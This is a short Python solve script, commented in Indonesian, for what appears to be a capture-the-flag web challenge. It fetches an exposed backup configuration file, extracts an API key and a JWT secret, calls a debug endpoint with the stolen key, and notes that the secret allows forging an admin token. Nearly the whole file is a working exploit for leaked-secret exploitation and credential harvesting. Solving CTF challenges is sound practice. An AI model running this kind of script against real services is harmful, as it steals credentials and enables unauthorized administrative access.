import requests
import json

BASE_URL = "http://chals1.apoorvctf.xyz:8001"

def solve():
    print("[*] Tahap 1: Mengunduh file backup konfigurasi...")
    
    # Target endpoint yang bocor di source code
    backup_url = f"{BASE_URL}/backup/config.json.bak"
    res = requests.get(backup_url)
    
    if res.status_code == 200:
        print("[+] File Backup Berhasil Ditemukan!\n")
        print("="*50)
        print(res.text)
        print("="*50)
        
        # Coba parse JSON untuk mencari API key atau Secret
        try:
            config_data = res.json()
            api_key = config_data.get("api_key") or config_data.get("API_KEY")
            jwt_secret = config_data.get("jwt_secret") or config_data.get("secret")
            
            if api_key:
                print(f"\n[*] Mengakses /api/v1/debug dengan API Key: {api_key}")
                headers = {"X-API-Key": api_key}
                debug_res = requests.get(f"{BASE_URL}/api/v1/debug", headers=headers)
                
                print("\n[!] Hasil Debug Endpoint:")
                print(debug_res.text)
            
            if jwt_secret:
                print(f"\n[!] BINGO! Kita mendapatkan JWT Secret: {jwt_secret}")
                print("[!] Kita bisa membuat token 'admin' kita sendiri.")
                
        except json.JSONDecodeError:
            print("\n[-] Format file bukan JSON murni, kita baca manual dari output di atas.")
    else:
        print(f"[-] Gagal mendapatkan backup. HTTP Status: {res.status_code}")

if __name__ == "__main__":
    solve()
